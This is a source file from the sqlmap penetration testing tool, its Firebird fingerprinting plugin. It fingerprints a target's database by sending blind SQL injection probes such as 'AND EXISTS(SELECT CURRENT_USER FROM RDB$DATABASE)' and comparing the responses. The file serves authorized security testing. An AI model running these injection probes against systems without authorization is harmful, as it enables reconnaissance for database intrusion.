#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.common import randomRange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.session import setDbms
from lib.core.settings import FIREBIRD_ALIASES
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.FIREBIRD
            return value

        actVer  = formatDBMSfp() + " (%s)" % (self.__dialectCheck())
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def __sysTablesCheck(self):
        retVal = None
        table = (
                    ("1.0", ["AND EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)"]),
                    ("1.5", ["AND NULLIF(%d,%d) IS NULL", "AND EXISTS(SELECT CURRENT_TRANSACTION FROM RDB$DATABASE)"]),
                    ("2.0", ["AND EXISTS(SELECT CURRENT_TIME(0) FROM RDB$DATABASE)", "AND BIT_LENGTH(%d)>0", "AND CHAR_LENGTH(%d)>0"]),
                    ("2.1", ["AND BIN_XOR(%d,%d)=0", "AND PI()>0.%d", "AND RAND()<1.%d", "AND FLOOR(1.%d)>=0"])
                 )

        for i in xrange(len(table)):
            version, checks = table[i]
            failed = False
            check = checks[randomRange(0,len(checks)-1)].replace("%d", getUnicode(randomRange(1,100)))
            payload = agent.fullPayload(check)
            result  = Request.queryPage(payload)
            if result:
                retVal = version
            else:
                failed = True
                break
            if failed:
                break

        return retVal

    def __dialectCheck(self):
        retVal = None
        if kb.dbms:
            payload = agent.fullPayload("AND EXISTS(SELECT CURRENT_DATE FROM RDB$DATABASE)")
            result  = Request.queryPage(payload)
            retVal = "dialect 3" if result else "dialect 1"
        return retVal

    def checkDbms(self):
        if conf.dbms in FIREBIRD_ALIASES:
            setDbms(DBMS.FIREBIRD)

            self.getBanner()

            if not conf.extensiveFp:
                return True

        logMsg = "testing Firebird"
        logger.info(logMsg)

        randInt = randomInt()

        payload = agent.fullPayload("AND EXISTS(SELECT * FROM RDB$DATABASE WHERE %d=%d)" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming Firebird"
            logger.info(logMsg)

            payload = agent.fullPayload("AND EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not Firebird"
                logger.warn(warnMsg)

                return False

            setDbms(DBMS.FIREBIRD)

            self.getBanner()

            if not conf.extensiveFp:
                return True

            kb.dbmsVersion = [self.__sysTablesCheck()]

            return True
        else:
            warnMsg = "the back-end DMBS is not Firebird"
            logger.warn(warnMsg)

            return False

    def forceDbmsEnum(self):
        conf.db = "Firebird (*)"
